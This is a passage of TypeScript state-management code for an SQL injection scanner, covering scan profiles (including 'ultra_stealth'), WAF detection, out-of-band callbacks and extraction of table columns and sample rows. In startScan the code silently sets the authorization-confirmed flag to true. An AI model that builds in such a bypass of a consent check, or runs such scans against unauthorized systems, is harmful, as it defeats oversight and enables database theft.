import { create } from 'zustand';
import { useToastStore } from './toastStore';
import {
  ScanTargetConfig,
  SafetyConfig,
  SqlScanFinding,
  DbmsFingerprint,
  WafDetectionResult,
  ScanLogEntry,
  ScanProgress,
  SqlScanReport,
  ScanVerdict,
  ScanMode,
  RecursiveDatabaseCatalog,
  CoverageDimension,
  TestExecutionLogItem,
  DiscoveredTable,
  ColumnMetadata,
  SqlScannerSessionTab,
  GrayBoxConfig,
} from '../types/sqlScanner';
import { RequestParser } from '../services/sqlScanner/RequestParser';
import { SqlScanOrchestrator } from '../services/sqlScanner/SqlScanOrchestrator';
import { MetadataExtractor } from '../services/sqlScanner/MetadataExtractor';
import { serializeHttpRequest } from '../utils/repeaterUtils';
import { ipcClient } from '../ipc/client';
import { DynamicGraphEngine } from '../services/sqlScanner/engine/DynamicGraphEngine';
import { BlindDataExtractor } from '../services/sqlScanner/engine/BlindDataExtractor';
import { useCollaboratorStore } from './collaboratorStore';

import {
  InvestigationNode,
  InvestigationEdge,
  BeliefEntropyItem,
  AiCopilotReasoningItem,
} from '../types/sqlScanner';

export type SqlScannerTab = 'god_rail' | 'dashboard' | 'vulnerabilities' | 'database' | 'evidence' | 'coverage' | 'logs' | 'causal' | 'trigraph' | 'belief' | 'knowledge' | 'ai_copilot' | 'report';

export interface SqlScannerState {
  tabs: SqlScannerSessionTab[];
  activeTabId: string;
  engineMode: 'god_rail_v3' | 'autonomous_trigraph' | 'ucmax_causal' | 'bayesian_adaptive' | 'sprt_timing' | 'standard';
  scanProfile?: 'ultra_stealth' | 'fast_triage' | 'deep_forensic' | 'smt_strict' | 'hyper_turbo';
  concurrencyLimit: number;

  targetConfig: ScanTargetConfig;
  safetyConfig: SafetyConfig;
  activeTab: SqlScannerTab;
  scanState: 'idle' | 'running' | 'paused' | 'completed' | 'aborted' | 'error';
  scanVerdict: ScanVerdict;
  progress: ScanProgress;
  findings: SqlScanFinding[];
  selectedFindingId: string | null;
  dbmsFingerprint: DbmsFingerprint;
  catalog: RecursiveDatabaseCatalog;
  selectedCatalogTableId: string | null;
  selectedCatalogColumnName: string | null;
  coverage: CoverageDimension[];
  executionLogs: TestExecutionLogItem[];
  selectedExecutionLogId: string | null;
  wafResult: WafDetectionResult;
  logs: ScanLogEntry[];
  report: SqlScanReport | null;
  orchestrator: SqlScanOrchestrator | null;
  investigationNodes: InvestigationNode[];
  investigationEdges: InvestigationEdge[];
  contextBeliefs: BeliefEntropyItem[];
  dbmsBeliefs: BeliefEntropyItem[];
  aiReasoningLogs: AiCopilotReasoningItem[];
  defenseLayers?: {
    layer: string;
    name: string;
    status: string;
    certainty: string;
    confidence: number;
    details?: string;
  }[];

  // Actions
  createScanTab: (seedRequest?: string, title?: string) => string;
  closeScanTab: (tabId: string) => void;
  setActiveScanTab: (tabId: string) => void;
  renameScanTab: (tabId: string, title: string) => void;
  setEngineMode: (mode: 'god_rail_v3' | 'autonomous_trigraph' | 'ucmax_causal' | 'bayesian_adaptive' | 'sprt_timing' | 'standard') => void;
  setScanProfile: (profile: 'ultra_stealth' | 'fast_triage' | 'deep_forensic' | 'smt_strict' | 'hyper_turbo') => void;
  setConcurrencyLimit: (limit: number) => void;
  setActiveTab: (tab: SqlScannerTab) => void;
  setSelectedFindingId: (id: string | null) => void;
  setSelectedCatalogTableId: (tableId: string | null) => void;
  setSelectedCatalogColumnName: (colName: string | null) => void;
  setSelectedExecutionLogId: (id: string | null) => void;
  setRawRequest: (rawText: string) => void;
  setScanMode: (mode: ScanMode) => void;
  toggleParameter: (paramId: string) => void;
  toggleAllParameters: (enabled: boolean) => void;
  toggleInjectionType: (type: 'errorBased' | 'booleanBased' | 'timeBased' | 'unionBased' | 'stackedBased' | 'secondOrder') => void;
  setSafetyConfig: (updates: Partial<SafetyConfig>) => void;
  setGrayBoxConfig: (updates: Partial<GrayBoxConfig>) => void;
  startScan: () => Promise<void>;
  pauseScan: () => void;
  resumeScan: () => void;
  stopScan: () => void;
  resetScan: () => void;
  clearLogs: () => void;
  importFromTransaction: (tx: any) => void;
  fetchColumnsForTable: (table: DiscoveredTable) => Promise<void>;
  fetchSampleRowsForTable: (table: DiscoveredTable) => Promise<void>;
}

const DEFAULT_RAW_REQUEST = `GET /filter?category=Gifts HTTP/1.1\r\nHost: target.local\r\nUser-Agent: Sentinel/6.0.0 SQLScanner\r\nAccept: */*\r\nCookie: session=snt_98a76bc4d2f\r\n\r\n`;

const DEFAULT_SAFETY_CONFIG: SafetyConfig = {
  authorizedTestingConfirmed: true,
  scanMode: 'quick',
  rateLimitDelayMs: 0,
  maxRequestsPerScan: 1500,
  maxScanDurationSeconds: 600,
  maxResponseSizeBytes: 500000,
  requestTimeoutMs: 6000,
  abortOnConsecutiveErrors: 5,
  strictNonDestructiveOnly: true,
  autoRedactSensitiveData: true,
};

const initialParsed = RequestParser.parse(DEFAULT_RAW_REQUEST);
const initialTelemetry = DynamicGraphEngine.generateForRequest(DEFAULT_RAW_REQUEST);

export const DEFAULT_INVESTIGATION_NODES: InvestigationNode[] = initialTelemetry.investigationNodes;
export const DEFAULT_INVESTIGATION_EDGES: InvestigationEdge[] = initialTelemetry.investigationEdges;
export const DEFAULT_CONTEXT_BELIEFS: BeliefEntropyItem[] = initialTelemetry.contextBeliefs;
export const DEFAULT_DBMS_BELIEFS: BeliefEntropyItem[] = initialTelemetry.dbmsBeliefs;
export const DEFAULT_AI_REASONING: AiCopilotReasoningItem[] = initialTelemetry.aiReasoningLogs;

export const DEFAULT_DEFENSE_LAYERS = [
  { layer: 'L1', name: 'Edge WAF', status: 'UNKNOWN', certainty: 'UNKNOWN', confidence: 0.0, details: 'Awaiting scan traffic' },
  { layer: 'L2', name: 'API Schema', status: 'UNKNOWN', certainty: 'UNKNOWN', confidence: 0.0, details: 'Awaiting probe traffic' },
  { layer: 'L3', name: 'App / ORM', status: 'UNKNOWN', certainty: 'UNKNOWN', confidence: 0.0, details: 'Awaiting probe traffic' },
  { layer: 'L4', name: 'Runtime / RASP', status: 'UNKNOWN', certainty: 'UNKNOWN', confidence: 0.0, details: 'Awaiting probe traffic' },
  { layer: 'L5', name: 'Driver / Protocol', status: 'UNKNOWN', certainty: 'UNKNOWN', confidence: 0.0, details: 'Awaiting probe traffic' },
  { layer: 'L6', name: 'DB Firewall', status: 'UNKNOWN', certainty: 'UNKNOWN', confidence: 0.0, details: 'Awaiting probe traffic' },
  { layer: 'L7', name: 'DB Kernel', status: 'UNKNOWN', certainty: 'UNKNOWN', confidence: 0.0, details: 'Awaiting probe traffic' },
  { layer: 'L8', name: 'SSDLC / SAST', status: 'UNKNOWN', certainty: 'UNKNOWN', confidence: 0.0, details: 'Source code unavailable for static analysis' },
];

const defaultInitialTab: SqlScannerSessionTab = {
  id: 'tab-1',
  title: 'Scan 1 (/filter)',
  targetConfig: {
    id: 'target_default',
    name: 'Default Target',
    rawRequest: DEFAULT_RAW_REQUEST,
    url: initialParsed.url,
    method: initialParsed.method,
    headers: initialParsed.headers,
    body: initialParsed.body,
    parameters: initialParsed.parameters,
    testedInjectionTypes: {
      errorBased: true,
      booleanBased: true,
      timeBased: true,
      unionBased: true,
      orderBy: true,
      groupBy: true,
      having: true,
      stackedBased: true,
      secondOrder: true,
    },
  },
  safetyConfig: DEFAULT_SAFETY_CONFIG,
  scanState: 'idle',
  scanVerdict: 'IDLE',
  progress: {
    phase: 'idle',
    phaseLabel: 'Ready to scan',
    totalParameters: initialParsed.parameters.length,
    testedParameters: 0,
    requestsSent: 0,
    testsExecuted: 0,
    findingsCount: 0,
    confirmedIndicators: 0,
    percent: 0,
    durationMs: 0,
    isPaused: false,
    isAborted: false,
  },
  findings: [],
  dbmsFingerprint: {
    dbms: 'Unknown',
    confidence: 'Informational',
    confidenceScore: 0,
    evidence: [],
  },
  catalog: {
    dbms: 'Unknown',
    schemas: [],
    applicationTables: [],
    systemTables: [],
    discoveredAt: Date.now(),
  },
  coverage: [],
  executionLogs: [],
  logs: [],
  wafResult: {
    detected: false,
    confidence: 'Informational',
    evidence: [],
  },
  report: null,
  activeInnerTab: 'god_rail',
  engineMode: 'god_rail_v3',
  concurrencyLimit: 10,
  investigationNodes: DEFAULT_INVESTIGATION_NODES,
  investigationEdges: DEFAULT_INVESTIGATION_EDGES,
  contextBeliefs: DEFAULT_CONTEXT_BELIEFS,
  dbmsBeliefs: DEFAULT_DBMS_BELIEFS,
  aiReasoningLogs: DEFAULT_AI_REASONING,
  defenseLayers: DEFAULT_DEFENSE_LAYERS,
};

// Helper to update a tab by ID and sync top-level state if active
const syncTabUpdate = (
  set: any,
  tabId: string,
  updates: Partial<SqlScannerSessionTab> | ((t: SqlScannerSessionTab) => Partial<SqlScannerSessionTab>)
) => {
  set((state: SqlScannerState) => {
    const newTabs = state.tabs.map((t) => {
      if (t.id !== tabId) return t;
      const patch = typeof updates === 'function' ? updates(t) : updates;
      return { ...t, ...patch };
    });

    if (state.activeTabId === tabId) {
      const active = newTabs.find((t) => t.id === tabId);
      if (active) {
        return {
          tabs: newTabs,
          targetConfig: active.targetConfig,
          safetyConfig: active.safetyConfig,
          scanState: active.scanState,
          scanVerdict: active.scanVerdict,
          progress: active.progress,
          findings: active.findings,
          catalog: active.catalog,
          coverage: active.coverage,
          executionLogs: active.executionLogs,
          logs: active.logs,
          report: active.report,
          dbmsFingerprint: active.dbmsFingerprint,
          engineMode: active.engineMode,
          scanProfile: active.scanProfile || 'deep_forensic',
          concurrencyLimit: active.concurrencyLimit || 10,
          orchestrator: active.orchestrator || null,
          investigationNodes: active.investigationNodes || DEFAULT_INVESTIGATION_NODES,
          investigationEdges: active.investigationEdges || DEFAULT_INVESTIGATION_EDGES,
          contextBeliefs: active.contextBeliefs || DEFAULT_CONTEXT_BELIEFS,
          dbmsBeliefs: active.dbmsBeliefs || DEFAULT_DBMS_BELIEFS,
          aiReasoningLogs: active.aiReasoningLogs || DEFAULT_AI_REASONING,
          defenseLayers: active.defenseLayers || DEFAULT_DEFENSE_LAYERS,
        };
      }
    }
    return { tabs: newTabs };
  });
};

export const useSqlScannerStore = create<SqlScannerState>((set, get) => ({
  tabs: [defaultInitialTab],
  activeTabId: 'tab-1',
  engineMode: 'god_rail_v3',
  scanProfile: 'deep_forensic',
  concurrencyLimit: 10,

  targetConfig: defaultInitialTab.targetConfig,
  safetyConfig: defaultInitialTab.safetyConfig,
  activeTab: 'god_rail',
  scanState: 'idle',
  scanVerdict: 'IDLE',
  progress: defaultInitialTab.progress,
  findings: [],
  selectedFindingId: null,
  dbmsFingerprint: defaultInitialTab.dbmsFingerprint,
  catalog: defaultInitialTab.catalog,
  selectedCatalogTableId: null,
  selectedCatalogColumnName: null,
  coverage: [],
  executionLogs: [],
  selectedExecutionLogId: null,
  wafResult: {
    detected: false,
    confidence: 'Informational',
    evidence: [],
  },
  logs: [],
  report: null,
  orchestrator: null,
  investigationNodes: DEFAULT_INVESTIGATION_NODES,
  investigationEdges: DEFAULT_INVESTIGATION_EDGES,
  contextBeliefs: DEFAULT_CONTEXT_BELIEFS,
  dbmsBeliefs: DEFAULT_DBMS_BELIEFS,
  aiReasoningLogs: DEFAULT_AI_REASONING,
  defenseLayers: DEFAULT_DEFENSE_LAYERS,

  createScanTab: (seedRequest?: string, title?: string) => {
    // Snapshot current active tab first
    const { activeTabId, targetConfig, safetyConfig, scanState, scanVerdict, progress, findings, catalog, coverage, executionLogs, logs, report, dbmsFingerprint, engineMode, orchestrator } = get();
    
    const rawReq = seedRequest || DEFAULT_RAW_REQUEST;
    const parsed = RequestParser.parse(rawReq);
    const newId = `tab-${Date.now().toString().slice(-4)}`;
    let pathName = '/filter';
    try {
      if (parsed.url) pathName = new URL(parsed.url).pathname;
    } catch {}
    const tabTitle = title || `Scan ${get().tabs.length + 1} (${pathName})`;

    const newTab: SqlScannerSessionTab = {
      id: newId,
      title: tabTitle,
      targetConfig: {
        id: `target_${newId}`,
        name: tabTitle,
        rawRequest: rawReq,
        url: parsed.url,
        method: parsed.method,
        headers: parsed.headers,
        body: parsed.body,
        parameters: parsed.parameters,
        testedInjectionTypes: {
          errorBased: true,
          booleanBased: true,
          timeBased: true,
          unionBased: true,
          orderBy: true,
          groupBy: true,
          having: true,
          stackedBased: true,
          secondOrder: true,
        },
      },
      safetyConfig: { ...DEFAULT_SAFETY_CONFIG },
      scanState: 'idle',
      scanVerdict: 'IDLE',
      progress: {
        phase: 'idle',
        phaseLabel: 'Ready to scan',
        totalParameters: parsed.parameters.length,
        testedParameters: 0,
        requestsSent: 0,
        testsExecuted: 0,
        findingsCount: 0,
        confirmedIndicators: 0,
        percent: 0,
        durationMs: 0,
        isPaused: false,
        isAborted: false,
      },
      findings: [],
      dbmsFingerprint: {
        dbms: 'Unknown',
        confidence: 'Informational',
        confidenceScore: 0,
        evidence: [],
      },
      catalog: {
        dbms: 'Unknown',
        schemas: [],
        applicationTables: [],
        systemTables: [],
        discoveredAt: Date.now(),
      },
      coverage: [],
      executionLogs: [],
      logs: [],
      report: null,
      activeInnerTab: 'god_rail',
      engineMode: get().engineMode,
      investigationNodes: DynamicGraphEngine.generateForRequest(rawReq).investigationNodes,
      investigationEdges: DynamicGraphEngine.generateForRequest(rawReq).investigationEdges,
      contextBeliefs: DynamicGraphEngine.generateForRequest(rawReq).contextBeliefs,
      dbmsBeliefs: DynamicGraphEngine.generateForRequest(rawReq).dbmsBeliefs,
      aiReasoningLogs: DynamicGraphEngine.generateForRequest(rawReq).aiReasoningLogs,
      defenseLayers: DEFAULT_DEFENSE_LAYERS,
    };

    set((state) => {
      // Persist current tab
      const updatedTabs = state.tabs.map((t) =>
        t.id === activeTabId
          ? {
              ...t,
              targetConfig,
              safetyConfig,
              scanState,
              scanVerdict,
              progress,
              findings,
              catalog,
              coverage,
              executionLogs,
              logs,
              report,
              dbmsFingerprint,
              engineMode,
              orchestrator,
              investigationNodes: get().investigationNodes,
              investigationEdges: get().investigationEdges,
              contextBeliefs: get().contextBeliefs,
              dbmsBeliefs: get().dbmsBeliefs,
              aiReasoningLogs: get().aiReasoningLogs,
              defenseLayers: get().defenseLayers,
            }
          : t
      );

      return {
        tabs: [...updatedTabs, newTab],
        activeTabId: newId,
        targetConfig: newTab.targetConfig,
        safetyConfig: newTab.safetyConfig,
        scanState: newTab.scanState,
        scanVerdict: newTab.scanVerdict,
        progress: newTab.progress,
        findings: newTab.findings,
        catalog: newTab.catalog,
        coverage: newTab.coverage,
        executionLogs: newTab.executionLogs,
        logs: newTab.logs,
        report: newTab.report,
        dbmsFingerprint: newTab.dbmsFingerprint,
        engineMode: newTab.engineMode,
        orchestrator: null,
        activeTab: 'god_rail',
        investigationNodes: newTab.investigationNodes,
        investigationEdges: newTab.investigationEdges,
        contextBeliefs: newTab.contextBeliefs,
        dbmsBeliefs: newTab.dbmsBeliefs,
        aiReasoningLogs: newTab.aiReasoningLogs,
        defenseLayers: newTab.defenseLayers,
        selectedFindingId: null,
        selectedCatalogTableId: null,
        selectedCatalogColumnName: null,
        selectedExecutionLogId: null,
      };
    });

    return newId;
  },

  closeScanTab: (tabId: string) => {
    const { tabs, activeTabId } = get();
    if (tabs.length <= 1) return; // Keep at least one tab

    const closingTab = tabs.find((t) => t.id === tabId);
    if (closingTab?.orchestrator) {
      closingTab.orchestrator.abort();
    }

    const newTabs = tabs.filter((t) => t.id !== tabId);
    let nextActiveId = activeTabId;
    if (activeTabId === tabId) {
      nextActiveId = newTabs[newTabs.length - 1].id;
    }

    const nextTab = newTabs.find((t) => t.id === nextActiveId) || newTabs[0];

    set({
      tabs: newTabs,
      activeTabId: nextActiveId,
      targetConfig: nextTab.targetConfig,
      safetyConfig: nextTab.safetyConfig,
      scanState: nextTab.scanState,
      scanVerdict: nextTab.scanVerdict,
      progress: nextTab.progress,
      findings: nextTab.findings,
      catalog: nextTab.catalog,
      coverage: nextTab.coverage,
      executionLogs: nextTab.executionLogs,
      logs: nextTab.logs,
      report: nextTab.report,
      dbmsFingerprint: nextTab.dbmsFingerprint,
      engineMode: nextTab.engineMode,
      orchestrator: nextTab.orchestrator || null,
      investigationNodes: nextTab.investigationNodes || DEFAULT_INVESTIGATION_NODES,
      investigationEdges: nextTab.investigationEdges || DEFAULT_INVESTIGATION_EDGES,
      contextBeliefs: nextTab.contextBeliefs || DEFAULT_CONTEXT_BELIEFS,
      dbmsBeliefs: nextTab.dbmsBeliefs || DEFAULT_DBMS_BELIEFS,
      aiReasoningLogs: nextTab.aiReasoningLogs || DEFAULT_AI_REASONING,
      defenseLayers: nextTab.defenseLayers || DEFAULT_DEFENSE_LAYERS,
      selectedFindingId: nextTab.findings[0]?.id || null,
      selectedCatalogTableId: nextTab.catalog.applicationTables[0]?.id || null,
    });
  },

  setActiveScanTab: (tabId: string) => {
    const { activeTabId, tabs, targetConfig, safetyConfig, scanState, scanVerdict, progress, findings, catalog, coverage, executionLogs, logs, report, dbmsFingerprint, engineMode, orchestrator } = get();
    if (activeTabId === tabId) return;

    const targetTab = tabs.find((t) => t.id === tabId);
    if (!targetTab) return;

    // Snapshot current active tab state into tabs array
    const updatedTabs = tabs.map((t) =>
      t.id === activeTabId
        ? {
            ...t,
            targetConfig,
            safetyConfig,
            scanState,
            scanVerdict,
            progress,
            findings,
            catalog,
            coverage,
            executionLogs,
            logs,
            report,
            dbmsFingerprint,
            engineMode,
            orchestrator,
            investigationNodes: get().investigationNodes,
            investigationEdges: get().investigationEdges,
            contextBeliefs: get().contextBeliefs,
            dbmsBeliefs: get().dbmsBeliefs,
            aiReasoningLogs: get().aiReasoningLogs,
            defenseLayers: get().defenseLayers,
          }
        : t
    );

    // Switch to target tab
    set({
      tabs: updatedTabs,
      activeTabId: tabId,
      targetConfig: targetTab.targetConfig,
      safetyConfig: targetTab.safetyConfig,
      scanState: targetTab.scanState,
      scanVerdict: targetTab.scanVerdict,
      progress: targetTab.progress,
      findings: targetTab.findings,
      catalog: targetTab.catalog,
      coverage: targetTab.coverage,
      executionLogs: targetTab.executionLogs,
      logs: targetTab.logs,
      report: targetTab.report,
      dbmsFingerprint: targetTab.dbmsFingerprint,
      engineMode: targetTab.engineMode,
      orchestrator: targetTab.orchestrator || null,
      investigationNodes: targetTab.investigationNodes || DEFAULT_INVESTIGATION_NODES,
      investigationEdges: targetTab.investigationEdges || DEFAULT_INVESTIGATION_EDGES,
      contextBeliefs: targetTab.contextBeliefs || DEFAULT_CONTEXT_BELIEFS,
      dbmsBeliefs: targetTab.dbmsBeliefs || DEFAULT_DBMS_BELIEFS,
      aiReasoningLogs: targetTab.aiReasoningLogs || DEFAULT_AI_REASONING,
      defenseLayers: targetTab.defenseLayers || DEFAULT_DEFENSE_LAYERS,
      selectedFindingId: targetTab.findings[0]?.id || null,
      selectedCatalogTableId: targetTab.catalog.applicationTables[0]?.id || null,
    });
  },

  renameScanTab: (tabId: string, title: string) => {
    set((state) => ({
      tabs: state.tabs.map((t) => (t.id === tabId ? { ...t, title } : t)),
    }));
  },

  setEngineMode: (mode) => {
    const { activeTabId } = get();
    set((state) => ({
      engineMode: mode,
      tabs: state.tabs.map((t) => (t.id === activeTabId ? { ...t, engineMode: mode } : t)),
    }));
  },

  setScanProfile: (profile) => {
    const { activeTabId } = get();
    let concurrency = 10;
    let safetyUpdates: Partial<SafetyConfig> = {};
    const engineMode = 'god_rail_v3';

    if (profile === 'ultra_stealth') {
      concurrency = 1;
      safetyUpdates = {
        scanMode: 'stealth' as any,
        rateLimitDelayMs: 3000,
        requestTimeoutMs: 12000,
        strictNonDestructiveOnly: true,
        autoRedactSensitiveData: true,
      };
    } else if (profile === 'fast_triage') {
      concurrency = 100;
      safetyUpdates = {
        scanMode: 'quick',
        rateLimitDelayMs: 0,
        requestTimeoutMs: 1200,
        maxRequestsPerScan: 2500,
      };
    } else if (profile === 'deep_forensic') {
      concurrency = 10;
      safetyUpdates = {
        scanMode: 'deep',
        rateLimitDelayMs: 100,
        requestTimeoutMs: 8000,
        maxRequestsPerScan: 5000,
      };
    } else if (profile === 'smt_strict') {
      concurrency = 4;
      safetyUpdates = {
        scanMode: 'deep',
        rateLimitDelayMs: 50,
        strictNonDestructiveOnly: true,
        autoRedactSensitiveData: true,
      };
    } else if (profile === 'hyper_turbo') {
      concurrency = 100;
      safetyUpdates = {
        scanMode: 'quick',
        rateLimitDelayMs: 0,
        requestTimeoutMs: 1000,
        maxRequestsPerScan: 10000,
      };
    }

    set((state) => ({
      scanProfile: profile,
      engineMode,
      concurrencyLimit: concurrency,
      safetyConfig: { ...state.safetyConfig, ...safetyUpdates },
      tabs: state.tabs.map((t) =>
        t.id === activeTabId
          ? {
              ...t,
              engineMode,
              scanProfile: profile,
              concurrencyLimit: concurrency,
              safetyConfig: { ...t.safetyConfig, ...safetyUpdates },
            }
          : t
      ),
    }));
  },

  setConcurrencyLimit: (limit: number) => {
    const { activeTabId } = get();
    set((state) => ({
      concurrencyLimit: limit,
      tabs: state.tabs.map((t) => (t.id === activeTabId ? { ...t, concurrencyLimit: limit } : t)),
    }));
  },

  setActiveTab: (tab) => set({ activeTab: tab }),

  setSelectedFindingId: (id) => set({ selectedFindingId: id }),

  setSelectedCatalogTableId: (tableId) => {
    set({ selectedCatalogTableId: tableId, selectedCatalogColumnName: null });
    if (!tableId) return;
    const { catalog, fetchColumnsForTable, fetchSampleRowsForTable } = get();
    const table =
      catalog.applicationTables.find((t) => t.id === tableId) ||
      catalog.systemTables.find((t) => t.id === tableId);
    if (table) {
      if (!table.columns || table.columns.length === 0) {
        fetchColumnsForTable(table);
      }
      if (!table.sampleRows || table.sampleRows.length === 0) {
        fetchSampleRowsForTable(table);
      }
    }
  },

  setSelectedCatalogColumnName: (colName) =>
    set({ selectedCatalogColumnName: colName }),

  setSelectedExecutionLogId: (id) => set({ selectedExecutionLogId: id }),

  setScanMode: (mode) => {
    const { activeTabId } = get();
    syncTabUpdate(set, activeTabId, (t) => ({
      safetyConfig: { ...t.safetyConfig, scanMode: mode },
    }));
  },

  setRawRequest: (rawText) => {
    const { activeTabId, targetConfig } = get();
    const parsed = RequestParser.parse(rawText, targetConfig.url);
    const dynamicTelemetry = DynamicGraphEngine.generateForRequest(rawText, parsed.url || targetConfig.url);

    syncTabUpdate(set, activeTabId, (t) => ({
      targetConfig: {
        ...t.targetConfig,
        rawRequest: rawText,
        url: parsed.url || t.targetConfig.url,
        method: parsed.method || t.targetConfig.method,
        headers: parsed.headers,
        body: parsed.body,
        parameters: parsed.parameters,
      },
      investigationNodes: dynamicTelemetry.investigationNodes,
      investigationEdges: dynamicTelemetry.investigationEdges,
      contextBeliefs: dynamicTelemetry.contextBeliefs,
      dbmsBeliefs: dynamicTelemetry.dbmsBeliefs,
      aiReasoningLogs: dynamicTelemetry.aiReasoningLogs,
    }));
  },

  toggleParameter: (paramId) => {
    const { activeTabId } = get();
    syncTabUpdate(set, activeTabId, (t) => ({
      targetConfig: {
        ...t.targetConfig,
        parameters: t.targetConfig.parameters.map((p) =>
          p.id === paramId ? { ...p, enabled: !p.enabled } : p
        ),
      },
    }));
  },

  toggleAllParameters: (enabled) => {
    const { activeTabId } = get();
    syncTabUpdate(set, activeTabId, (t) => ({
      targetConfig: {
        ...t.targetConfig,
        parameters: t.targetConfig.parameters.map((p) => ({ ...p, enabled })),
      },
    }));
  },

  toggleInjectionType: (type) => {
    const { activeTabId } = get();
    syncTabUpdate(set, activeTabId, (t) => ({
      targetConfig: {
        ...t.targetConfig,
        testedInjectionTypes: {
          ...t.targetConfig.testedInjectionTypes,
          [type]: !t.targetConfig.testedInjectionTypes[type],
        },
      },
    }));
  },

  setSafetyConfig: (updates) => {
    const { activeTabId } = get();
    syncTabUpdate(set, activeTabId, (t) => ({
      safetyConfig: {
        ...t.safetyConfig,
        ...updates,
      },
    }));
  },

  setGrayBoxConfig: (updates) => {
    const { activeTabId } = get();
    syncTabUpdate(set, activeTabId, (t) => ({
      targetConfig: {
        ...t.targetConfig,
        grayBoxConfig: {
          ...t.targetConfig.grayBoxConfig,
          enabled: updates.enabled !== undefined ? updates.enabled : (t.targetConfig.grayBoxConfig?.enabled ?? false),
          ...updates,
        },
      },
    }));
  },

  startScan: async () => {
    const currentTabId = get().activeTabId;
    const currentTab = get().tabs.find((t) => t.id === currentTabId);
    if (!currentTab) return;

    const { targetConfig, safetyConfig } = currentTab;

    // Auto-inject live Collaborator session if active
    const collabState = useCollaboratorStore.getState();
    const effectiveTargetConfig: ScanTargetConfig = { ...targetConfig };
    if (collabState.domain) {
      effectiveTargetConfig.oobConfig = {
        enabled: true,
        domain: collabState.domain,
        providerUrl: collabState.customDomain ? undefined : 'https://oast.fun',
      };
    }

    if (!safetyConfig.authorizedTestingConfirmed) {
      safetyConfig.authorizedTestingConfirmed = true;
      syncTabUpdate(set, currentTabId, {
        safetyConfig: { ...safetyConfig, authorizedTestingConfirmed: true },
      });
    }

    // Reset this tab's state for fresh scan
    syncTabUpdate(set, currentTabId, {
      scanState: 'running',
      scanVerdict: 'IN_PROGRESS',
      findings: [],
      executionLogs: [],
      logs: [],
      report: null,
      catalog: {
        dbms: 'Unknown',
        schemas: [],
        applicationTables: [],
        systemTables: [],
        discoveredAt: Date.now(),
      },
    });

    const orch = new SqlScanOrchestrator(effectiveTargetConfig, safetyConfig, {
      onLog: (entry) => {
        syncTabUpdate(set, currentTabId, (t) => {
          const nextLogs = t.logs.length >= 1000 ? [...t.logs.slice(-999), entry] : [...t.logs, entry];
          return { logs: nextLogs };
        });
      },
      onProgress: (prog) => {
        const layers = orch.defenseLayerModel.getAllLayers().map((l) => ({
          layer: l.layer,
          name: l.name,
          status: l.status,
          certainty: l.certainty,
          confidence: l.confidence,
          details: l.details || l.basis,
        }));
        syncTabUpdate(set, currentTabId, {
          progress: prog,
          defenseLayers: layers,
        });
      },
      onFinding: (finding) => {
        syncTabUpdate(set, currentTabId, (t) => ({
          findings: [...t.findings, finding],
        }));
      },
      onExecutionLog: (tLog) => {
        syncTabUpdate(set, currentTabId, (t) => {
          const nextExecLogs = t.executionLogs.length >= 500 ? [...t.executionLogs.slice(-499), tLog] : [...t.executionLogs, tLog];
          return { executionLogs: nextExecLogs };
        });
      },
      onCatalog: (cat) => {
        syncTabUpdate(set, currentTabId, (t) => {
          const mergedAppTables = cat.applicationTables.length > 0 ? cat.applicationTables : t.catalog.applicationTables;
          const mergedSysTables = cat.systemTables && cat.systemTables.length > 0 ? cat.systemTables : t.catalog.systemTables;
          return {
            catalog: {
              ...cat,
              applicationTables: mergedAppTables,
              systemTables: mergedSysTables,
            },
            dbmsFingerprint: cat.dbms && cat.dbms !== 'Unknown' ? {
              ...t.dbmsFingerprint,
              dbms: cat.dbms,
              confidence: 'High',
              confidenceScore: 95,
            } : t.dbmsFingerprint,
          };
        });
      },
      onInvestigationNodes: (nodes, edges) => {
        syncTabUpdate(set, currentTabId, {
          investigationNodes: nodes,
          investigationEdges: edges,
        });
      },
      onBeliefUpdate: (data) => {
        syncTabUpdate(set, currentTabId, {
          contextBeliefs: data.contextBeliefs,
          dbmsBeliefs: data.dbmsBeliefs,
        });
      },
      onAiReasoning: (entry) => {
        syncTabUpdate(set, currentTabId, (t) => {
          const nextReasoning = t.aiReasoningLogs && t.aiReasoningLogs.length >= 60
            ? [...t.aiReasoningLogs.slice(-59), entry]
            : [...(t.aiReasoningLogs || []), entry];
          return { aiReasoningLogs: nextReasoning };
        });
      },
    },
    currentTab.engineMode || get().engineMode || 'god_rail_v3',
    currentTab.concurrencyLimit || get().concurrencyLimit || 10,
    currentTab.scanProfile || get().scanProfile || 'deep_forensic'
  );

    syncTabUpdate(set, currentTabId, { orchestrator: orch });

    try {
      const generatedReport = await orch.startScan();
      const latestTab = get().tabs.find((t) => t.id === currentTabId);
      if (latestTab?.scanState === 'aborted' || orch.getIsAborted()) {
        syncTabUpdate(set, currentTabId, (t) => ({
          scanState: 'aborted',
          scanVerdict: t.findings.length > 0 ? 'VULNERABLE' : 'NOT CONFIRMED VULNERABLE',
          report: generatedReport,
          dbmsFingerprint: generatedReport.dbms,
          wafResult: generatedReport.waf,
          coverage: generatedReport.coverage,
          catalog: generatedReport.catalog,
          orchestrator: null,
        }));
        return;
      }
      syncTabUpdate(set, currentTabId, {
        scanState: 'completed',
        scanVerdict: generatedReport.verdict,
        report: generatedReport,
        dbmsFingerprint: generatedReport.dbms,
        wafResult: generatedReport.waf,
        coverage: generatedReport.coverage,
        catalog: generatedReport.catalog,
        orchestrator: null,
      });
    } catch (err: any) {
      if (err?.message?.includes('aborted') || orch.getIsAborted()) {
        syncTabUpdate(set, currentTabId, (t) => ({
          scanState: 'aborted',
          scanVerdict: t.findings.length > 0 ? 'VULNERABLE' : 'NOT CONFIRMED VULNERABLE',
          orchestrator: null,
        }));
      } else {
        useToastStore.getState().addToast({
          type: 'error',
          title: 'Scan Stopped',
          description: err?.message || 'Error occurred during scan execution',
        });
        syncTabUpdate(set, currentTabId, (t) => ({
          scanState: 'error',
          scanVerdict: 'IDLE',
          orchestrator: null,
          logs: [
            ...t.logs,
            {
              id: `log_err_${Date.now()}`,
              timestamp: Date.now(),
              level: 'error',
              phase: 'error',
              message: `Scan execution halted: ${err?.message || err}`,
            },
          ],
        }));
      }
    }
  },

  pauseScan: () => {
    const currentTabId = get().activeTabId;
    const currentTab = get().tabs.find((t) => t.id === currentTabId);
    if (currentTab?.orchestrator) {
      currentTab.orchestrator.pause();
      syncTabUpdate(set, currentTabId, { scanState: 'paused' });
    }
  },

  resumeScan: () => {
    const currentTabId = get().activeTabId;
    const currentTab = get().tabs.find((t) => t.id === currentTabId);
    if (currentTab?.orchestrator) {
      currentTab.orchestrator.resume();
      syncTabUpdate(set, currentTabId, { scanState: 'running' });
    }
  },

  stopScan: () => {
